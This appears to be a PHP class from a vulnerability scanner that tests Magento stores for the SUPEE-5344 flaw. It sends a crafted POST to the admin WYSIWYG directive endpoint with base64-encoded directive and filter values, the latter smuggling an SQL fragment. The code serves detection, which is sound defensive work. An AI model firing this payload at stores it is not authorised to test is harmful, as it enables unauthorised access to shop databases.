<?php

namespace Ontic\Yaes\Scanners\Magento;

use DOMDocument;
use Ontic\Yaes\Scanners\IScanner;
use Ontic\Yaes\Model\Target;

class Supee5344Scanner implements IScanner
{
    /**
     * @param Target $target
     * @return int
     */
    function getTargetStatus(Target $target)
    {

        $url = sprintf('http://%s:%d/%sindex.php/admin/Cms_Wysiwyg/directive/index/',
            $target->getHost(),
            $target->getPort(),
            $target->getBasePath());

        $postData = http_build_query([
            '___directive' => 'e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ%3D%3D',
            'filter' => 'cG9wdWxhcml0eVtmcm9tXT0wJnBvcHVsYXJpdHlbdG9dPTMmcG9wdWxhcml0eVtmaWVsZF9leHByXT0wKTs%3D',
            'forwarded' => 1
        ]);

        $options = [
            'http' => [
                'method'  => 'POST',
                'header'  => 'Content-type: application/x-www-form-urlencoded',
                'content' => $postData
        ]];

        $context  = stream_context_create($options);

        if(($responseBody = file_get_contents($url, false, $context)) === false)
        {
            return IScanner::STATUS_UNKNOWN;
        }

        if(@imagecreatefromstring($responseBody) === false)
        {
            return IScanner::STATUS_SAFE;
        }

        return IScanner::STATUS_VULNERABLE;
    }

    /**
     * @return string
     */
    function getName()
    {
        return 'SUPEE-5344';
    }
}